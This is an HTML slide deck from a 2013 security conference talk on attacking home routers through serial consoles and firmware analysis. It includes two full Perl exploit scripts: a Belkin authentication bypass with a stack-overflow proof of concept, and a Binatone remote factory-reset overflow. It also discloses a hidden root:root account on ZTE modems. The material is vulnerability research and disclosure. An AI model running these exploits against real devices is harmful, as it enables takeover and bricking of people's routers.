@@ -1,0 +1,573 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>reveal.js - The HTML Presentation Framework</title>
+
+		<meta name="description" content="A framework for easily creating beautiful presentations using HTML">
+		<meta name="author" content="Hakim El Hattab">
+
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<link rel="stylesheet" href="css/reveal.min.css">
+		<link rel="stylesheet" href="css/theme/default.css" id="theme">
+
+		<!-- For syntax highlighting -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- If the query includes 'print-pdf', use the PDF print sheet -->
+		<script>
+			document.write( '<link rel="stylesheet" href="css/print/' + ( window.location.search.match( /print-pdf/gi ) ? 'pdf' : 'paper' ) + '.css" type="text/css" media="print">' );
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+<div class="slides">
+    <section data-background-color="rgba( 12, 25, 77, 0.6)">
+        <h1>
+            <br>
+        </h1>
+<h1>Serial killing of embedded systems</h1>
+<div>Ground Zero Summit - 2013</div>
+<div>
+        <br>
+        </div>
+<div>Atul Alex Cherian,</div>
+<div>Research Bundle</div>
+    </section>
+    <section data-background-color="rgba( 12, 25, 77, 0.6)">
+        <h2>agenda</h2>
+<div>
+        <br>
+    </div>
+<div>
+    <ul>
+<li>Introduction to the topic.</li>
+<li>Some basic steps to follow when analyzing&nbsp;<span>embedded systems.</span>
+</li>
+<li>
+    <span>Analysis of a few case-studies.</span>
+</li>
+<li>
+<span>Moral of the story.</span>
+</li>
+</ul>
+</div>
+</section>
+<section>
+    <section data-background-color="rgba( 12, 25, 77, 0.6)">
+        <h2>Introduction : why???</h2>
+<div>
+        <br>
+    </div>
+<div>
+    <ul>
+<li>I recently got interested in studying electronics.</li>
+<li>We are surrounded by embedded systems today.</li>
+<li>Its fun &amp; something different! :)</li>
+</ul>
+</div>
+<div>
+<br>
+</div>
+<div>
+<br>
+</div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>introduction : the usual PT approach</h2>
+<div>
+    <br>
+</div>
+<div>
+<ul>
+<li>Run <i>Nmap</i> to enumerate open ports &amp; services.</li>
+<li>Test each service for known or default credentials to gain access.</li>
+<li>If there is a <i>web-server</i> running, carry out the usual tests against it.</li>
+<li>You hit "<b>Jackpot</b>" if somehow access to the admin console is achieved by either guessing the credentials or finding a vulnerability in the web interface.</li>
+</ul>
+</div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>Introduction : limitations</h2>
+<div>
+    <br>
+</div>
+<div>
+<ul>
+<li>Its a classic "Black-box" testing approach &amp; doesn't really cover everything.</li>
+<li>It can be carried out without even studying the device or its underlying OS* which really means that you are just scratching the surface.</li>
+<li>You miss out on all the fun &amp; easter-eggs hidden deep inside.</li>
+</ul>
+</div>
+</section>
+</section>
+<section>
+    <section data-background-color="rgba( 12, 25, 77, 0.6)">
+        <h2>walk-through : Skills needed?</h2>
+<div>
+        <br>
+    </div>
+<div>
+    <ul>
+        <li>Basic understanding of electronic concepts &amp; components.</li>
+        <li>Basic soldering skills.</li>
+        <li>Some "Reverse Engineering" experience.</li>
+        <li>Patience.</li>
+        <li>Common-sense (Mandatory!)</li>
+    </ul>
+</div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>Walk-through : Circuit analysis</h2>
+    <div>
+        <br>
+    </div>
+    <div>
+        <ul>
+            <li>Gather manufacturer details &amp; part numbers of all ICs present in the circuit.</li>
+            <li>Search online for datasheets of each these.</li>
+            <li>Look for unpopulated header-pins or test-points on the board.</li>
+        </ul>
+    </div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>Binatone "DT 845w" adsl2+ router</h2>
+    <div>
+        <img src="images/WP_20131030_004.jpg" style="width: 951.4937822592013px; height: 525.937008290779px; max-height: none; max-width: none;">
+        <br>
+    </div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>dt 845w : Serial port header</h2>
+    <div>
+        <img src="images/UART_pins.jpg" style="width: 938.4960634088892px; height: 527.2439638276085px; max-height: none; max-width: none;">
+        <br>
+    </div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>dt 845w : serial port header</h2>
+    <div>
+        <img src="images/WP_20131003_003.jpg" style="width: 937.1837274508839px; height: 526.5066978556458px; max-height: none; max-width: none;">
+        <br>
+    </div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>walk-through : Serial console</h2>
+	<video width="800" height="600" controls><source src="videos/bsnl_serial.ogv" type="video/mp4"></video>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>walk-through : firmware</h2>
+    <div>
+        <br>
+    </div>
+    <div>
+        <ul>
+            <li>So far, we have managed to get access to the serial console on the device.&nbsp;</li>
+            <li>This already gives us an edge. Usually, apart from all the debug logs &amp; other important messages, serial console will also provide you with some commands to probe the device's internals further.</li>
+            <li>Last thing we'll need before we can start testing is the firmware completely disassembled.</li>
+        </ul>
+    </div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>walk-through : FW disassembly</h2>
+    <div>
+        <ul>
+            <li>This step will vary from device to device &amp; from vendor to vendor. There are no hard and fast rules.</li>
+            <li>The messages found in the serial console during boot will most likely contain the "loading address/offset" apart from other crucial information.</li>
+            <li>Information gathered from datasheets collected earlier will also help us big time in selecting the right options in IDA later.</li>
+            <li>"<b>Binwalk</b>" &amp; "<b>IDA Pro</b>" will mostly suffice for the job apart from custom IDA python scripts &amp; few modifications to binwalk if the default configuration doesn't cut it.</li>
+        </ul>
+    </div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>walk-through : FW Disassembly</h2>
+    <div>
+        <img src="images/zte_telnet_ida.png" style="width: 926.0376835596893px; height: 400.5013127527212px; max-height: none; max-width: none;">
+        <br>
+    </div>
+</section>
+</section>
+<section>
+    <section data-background-color="rgba( 12, 25, 77, 0.6)">
+        <h2>case-study : Belkin wireless router</h2>
+        <div>
+            <video width="800" height="600" controls><source src="videos/belkin_serial.ogv" type="video/mp4"></video>
+        </div>
+    </section>
+    <section data-background-color="rgba( 12, 25, 77, 0.6)">
+        <h2>case-study : Belkin RCE</h2>
+        <div>
+            <video width="800" height="600" controls><source src="videos/classic_stack-based-bo.ogv" type="video/mp4"></video>
+        </div>
+    </section>
+    <section data-background-color="rgba( 12, 25, 77, 0.6)">
+        <h2>case-study : Belkin Rce poc-2</h2>
+        <div>
+<pre><code>+-----------------------------------+
+| Belkin G Wireless Router RCE PoC. |
++-----------------------------------+
+ 
+ 
+ 
+Firmware Version : 5.00.12 (Sep 10 2009 19:54:12)
+Boot Version     : 1.18
+Hardware         : F5D7234-4 v5 (01)
+Author           : Aodrulez.
+Email            : atul.alex@orchidseven.com
+Twitter          : http://twitter.com/Aodrulez
+ 
+  
++---------+
+| Details |
++---------+
+  
+The exploit works in 3 stages.
+1. Authentication.
+2. Setting up shellcode in the memory at a known location.
+3. Triggering an RA register over-write to execute the shellcode.
+  
+This particular model of router is based on 'embedded Configurable operating system' a.k.a (eCos) version 2.0. The shellcode used in the exploit is a dummy one that basically just triggers an exception &amp; crashes the router, forcing it to reboot.
+ 
+ 
+Video Demo :
+http://www.youtube.com/watch?v=MtrYs-f6X3E
+ 
+ 
++---------+
+| Exploit |
++---------+
+ 
+#!/usr/bin/perl
+ 
+use strict;
+use warnings;
+use LWP 5.64;
+$| = 1;
+ 
+# Variable declarations.
+my $browser = LWP::UserAgent-&gt;new;
+my $passHash="";
+my $url ="";
+my $response ="";
+my $ip="";
+$browser -&gt;timeout(10);
+ 
+ 
+# Just a few nops followed by a dummy shellcode that crashes &amp; reboots the router.
+my $shellcode="\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x04\xd0\xff\xff\x20\x20\x20\x20";
+ 
+ 
+ 
+sub Authenticate()
+{
+  print "[+] Trying to authenticate.\n";
+  $url= "http://$ip/login.stm";
+  $response = $browser-&gt;get( $url);
+  my @aod= $response-&gt;content =~ m/var password = "(.*)";/g;
+  if(!$aod[0])
+  {
+     print "[-] Damn! Something went wrong. This might not work here :-/\n";
+     exit;
+  }
+  else
+  {
+     $passHash=$aod[0];
+     print "[+] Admin Password = $passHash (MD5 Hash).\n";
+  }
+ 
+ print "[+] Time to authenticate you!\n";
+ $url = "http://$ip/cgi-bin/login.exe";
+ $response = $browser-&gt;post( $url,
+    [ 'totalMSec' =&gt; "1377121454.99",  
+      'pws' =&gt; "$passHash",
+    ,]
+  );
+   
+  if( $response-&gt;content =~ /index/ ) 
+  {
+    print "[+] Logged in successfully as 'Admin'!\n";
+    print "[!] Open this link in a browser for admin access : http://$ip/setup.htm \n";
+  } else {
+    print "[-] Login failed! This might not work here :-/\n";
+    exit;
+  }
+ 
+  print "\n[+] Continue with exploitation? (Y/N) : ";
+  my $temp=&lt;STDIN&gt;;
+  if ($temp=~"Y" || $temp=~"y")
+  {
+    Exploit();
+  }
+  else
+  {
+    print "[+] Have fun!\n\n";
+    exit;
+  }
+}
+ 
+ 
+sub Exploit()
+{
+# Stage 1: Fill shellcode at a known location : 0x803c0278 (Buffer=120 bytes)
+# 0x803c0278 is fixed for this device/firmware combination.
+  print "[+] Stage 1 : Allocating shellcode.\n";
+ 
+  if (length($shellcode) &gt; 120)
+  {
+   print "[-] Shellcode is too big! (120 bytes Max)\n";
+   exit;
+  }
+  print "[+] Shellcode length : ".length($shellcode)."\n";
+ 
+  # Fill the rest with nops. Not needed but good to have.
+  # Shellcode size should be ideally a multiple of 4 as this is MIPS.
+  my $nopsize=120-length($shellcode);
+  $shellcode=$shellcode.("\x20"x$nopsize);
+ 
+ $url = "http://$ip/cgi-bin/wireless_WPA.exe";
+ $response = $browser-&gt;post( $url,
+    [ 'wpa_authen' =&gt; "1",  
+      'wpa_psk' =&gt; '0',
+      's_rekeysec' =&gt; '900000',
+      's_rekeypkt' =&gt; '1000',
+      'w802_rekey' =&gt; '0',
+      'encryption' =&gt; '3',
+      'security_type' =&gt; '4',
+      'authentication' =&gt; '3',
+      'encryption_hid' =&gt; '3',
+      'wpa_key_text' =&gt; "ssss",
+      'wpa_key_pass' =&gt; "$shellcode",
+      'obscure_psk' =&gt; '1',
+      'sharedkey_alter' =&gt; '',
+      'sharedkey_alter1' =&gt; '1',
+       
+    ,]
+  );
+  
+  if( !$response-&gt;content ) 
+  {
+     print "[-] Damn! Something went wrong. This might not work here :-/\n";  
+  }
+  else 
+  {   
+    print "[+] Stage 1 seems to have gone well.\n";
+  }
+ 
+# Stage 2: Trigger Stack Overflow &amp; overwrite RA
+print "[+] Stage 2 : Triggering Return Address overwrite.\n";
+ 
+my $junk="A"x32;
+my $s0="BBBB";
+my $s1="CCCC";
+my $ra="\x78\x02\x3c\x80"; #EPC   -&gt; 0x803c0278 Fixed for this device/firmware combination.
+my $nop="\x20\x20\x20\x20";
+my $payload=$junk.$s0.$s1.$ra.$nop;
+ 
+ $url = "http://$ip/cgi-bin/wireless_WPS_Enroll.exe";
+ $response = $browser-&gt;post( $url,[ 'pin' =&gt; "$payload"]);
+ if( !$response-&gt;content ) 
+  {
+    print "[-] Damn! Something went wrong. This might not work here :-/\n";  
+  } 
+ else 
+ {
+    print "[-] Done! \\m/\n";
+ }
+ 
+}
+ 
+sub Welcome()
+{
+  print "\n\n+------------------------------------------+\n";
+  print "|  Belkin G Wireless Router Remote Exploit |\n";
+  print "|     (Authentication bypass &amp; RCE PoC)    |\n";
+  print "+------------------------------------------+\n";
+  print "[+] By Aodrulez.\n";
+  print "\n[+] Usage   : perl $0 router_ip";
+  print "\n[!] Example : perl $0 192.168.2.1";
+ 
+  if (!$ARGV[0])
+  {
+    print "\n[-] (o_0) Seriously??\n";
+    exit;
+  }
+ 
+  $ip=$ARGV[0];
+  print "\n[+] Target IP : $ip\n";
+ 
+}
+ 
+# Burn!!
+Welcome();
+Authenticate();
+# End of exploit code.
+ </code>        </pre>
+    </div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>case-study : ZTE ZXDSL 831Aii</h2>
+    <div>
+        <img src="images/ZTE.png" style="width: 740.5250196701576px; height: 525.3753285007526px; max-height: none; max-width: none;">
+        <br>
+    </div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>case-study : ZTE 831aii telnet fun</h2>
+    <div>
+        <video width="800" height="600" controls><source src="videos/bsnl_telnet_overflow.ogv" type="video/mp4"></video>
+    </div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>airtel's binatone dt845w wifi router</h2>
+    <div>
+        <img src="images/airtel_dt845w.png" style="width: 938.329388924671px; height: 493.5538061910414px; max-height: none; max-width: none;">
+        <br>
+    </div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>AIRTEL'S BINATONE DT845W WIFI ROUTER</h2>
+    <div>
+        <img src="images/AIRTEL_DT_ACS.png" style="width: 838.8740161647947px; height: 528.038761664559px; max-height: none; max-width: none;">
+        <br>
+    </div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>binatone dt 845w remote factory reset 0-DAY</h2>
+    <div>
+<pre><code>#!/usr/bin/perl
+# Tested against firmware version DT4W-A5.008</span>
+use strict;
+use warnings;
+use LWP 5.64;
+use HTTP::Request::Common qw (POST);
+my $ua = LWP::UserAgent-&gt;new;
+my $fuzz="A"x132;
+my $rip="\x80\x04\x16\xec";  # Factory reset function. 
+my $fuzz2="ssss"x3;
+my $boom="\x80\x04\x16\xec";
+my $fuzz3="\xac\x24\x02\x04"x(104/4);
+my $req= POST 'http://192.168.1.1/Forms/access_ddns_1',
+            Content =&gt; [
+            'Enable_DyDNS'=&gt;"1",
+	    'sysDNSHost'=&gt;$fuzz.$rip.$fuzz2.$boom.$fuzz3,</code><code>];
+my $response=$ua-&gt;request($req)-&gt;as_string;
+print $response;<br></code>    </pre>
+</div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>binatone dt845w wifi router</h2>
+    <div>
+        <img src="images/rompager.png" style="width: 711.7732025978476px; height: 521.9265096031149px; max-height: none; max-width: none;">
+        <br>
+    </div>
+</section>
+<section data-background-color="rgba( 12, 25, 77, 0.6)">
+    <h2>CASE-STUDY : NOT DONE YET!</h2>
+    <div>
+        <br>
+    </div>
+    <div>
+        <ul>
+            <li>Airtel's Binatone <b>DT845W</b> WIFI DSL router can be remotely bricked as well.</li>
+            <li>ZTE ZXDSL <b>831AII</b> modem provided* by BSNL has a superuser account "<b>root:root</b>" apart from the default "admin:admin" which can be used to remotely login via telnet as well as on the web-admin-interface. No mention of this account was found anywhere on the internet.</li>
+            <li>The above account can be deleted by the user &amp; hence, not to be considered as a backdoor. Its interesting nonetheless.</li>
+        </ul>
+    </div>
+</section>
+</section>
+<section>
+    <section data-background-color="rgba( 12, 25, 77, 0.6)">
+        <h2>moral of the story</h2>
+        <div>
+            <br>
+        </div>
+        <div>
+            <ul>
+                <li>Embedded systems are interesting targets today and can prove to be the weakest link in security if they are part of the network.</li>
+                <li>Vendors must strictly follow secure coding practices &amp; thoroughly test the devices before deployment.</li>
+            </ul>
+            <div style="text-align: left;">
+                <br>
+            </div>
+            <h3>food for thought</h3>
+            <blockquote>"Vulnerable devices are much worse than backdoored ones"</blockquote>
+            <br>
+        </div>
+    </section>
+    <section data-background-color="rgba( 12, 25, 77, 0.6)">
+        <h2>Thank you</h2>
+        <div>
+            <br>
+        </div>
+        <div>
+            <br>
+        </div>
+        <p>Atul Alex Cherian</p>
+        <p>( @Aodrulez )</p>
+        <p>
+        <br>
+    </p>
+    <p>
+    <b>Email :&nbsp;</b>
+</p>
+<p>atul.alex@researchbundle.com</p>
+<p>atul.alex@orchidseven.com</p>
+<p>
+<br>
+</p>
+<p>
+<b>[</b> www.ResearchBundle.com <b>]</b>
+</p>
+</section>
+</section>
+</div>
+
+
+
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.min.js"></script>
+
+		<script>
+
+			// Full list of configuration options available here:
+			// https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
+				transition: Reveal.getQueryHash().transition || 'default', // default/cube/page/concave/zoom/linear/fade/none
+
+				// Optional libraries used to extend on reveal.js
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+					{ src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
